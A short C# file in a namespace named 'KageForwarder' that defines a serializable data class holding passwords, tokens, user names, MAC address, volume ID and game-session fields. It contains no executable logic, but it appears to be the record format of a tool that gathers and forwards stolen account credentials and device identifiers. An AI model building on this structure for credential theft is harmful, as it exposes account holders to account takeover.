using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using System.Text;
using System.Threading.Tasks;

namespace KageForwarder
{
	[DataContract]
	internal class Data
	{
		[DataMember]
		public string reg { get; set; }
		[DataMember]
		public string cognito { get; set; }

		[DataMember]
		public string lastlogin { get; set; }
		[DataMember]
		public string gid { get; set; }

		[DataMember]
		public string lastworld { get; set; }

		[DataMember]
		public string passwords { get; set; }

		[DataMember]
		public string volid { get; set; }

		[DataMember]
		public string MAC { get; set; }

		[DataMember]
		public string user { get; set; }

		[DataMember]
		public string token { get; set; }
	}
}
